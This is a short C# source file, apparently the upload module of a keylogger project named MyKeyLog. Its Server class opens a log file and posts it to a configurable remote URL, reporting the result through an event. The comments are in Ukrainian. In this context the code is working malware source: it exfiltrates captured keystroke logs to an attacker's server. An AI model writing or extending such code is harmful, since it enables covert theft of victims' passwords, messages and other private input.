
using System;
using System.IO;
using System.Net.Http;
using System.Threading.Tasks;

namespace MyKeyLog
{
    public class Server
    {
        private string _serverUrl;
        public event Action<string> OnLogFileSent; // Делегат для зворотного зв'язку

        public Server(string serverUrl)
        {
            _serverUrl = serverUrl;
        }

        public async Task SendLogFileToServerAsync(string logFilePath)
        {
            using (var httpClient = new HttpClient())
            {
                using (var content = new MultipartFormDataContent())
                {
                    // Додаємо файл до запиту
                    var fileStream = new FileStream(logFilePath, FileMode.Open, FileAccess.Read);
                    content.Add(new StreamContent(fileStream), "file", Path.GetFileName(logFilePath));

                    try
                    {
                        // Відправляємо запит на сервер
                        var response = await httpClient.PostAsync(_serverUrl, content);

                        if (response.IsSuccessStatusCode)
                        {
                            string result = await response.Content.ReadAsStringAsync();
                            OnLogFileSent?.Invoke("Log sent successfully");
                        }
                        else
                        {
                            string errorResult = await response.Content.ReadAsStringAsync();
                            OnLogFileSent?.Invoke($"Error: {response.StatusCode} - {errorResult}");
                        }
                    }
                    catch (Exception ex)
                    {
                        OnLogFileSent?.Invoke($"Exception while sending log: {ex.Message}");
                    }
                }
            }
        }
    }
}
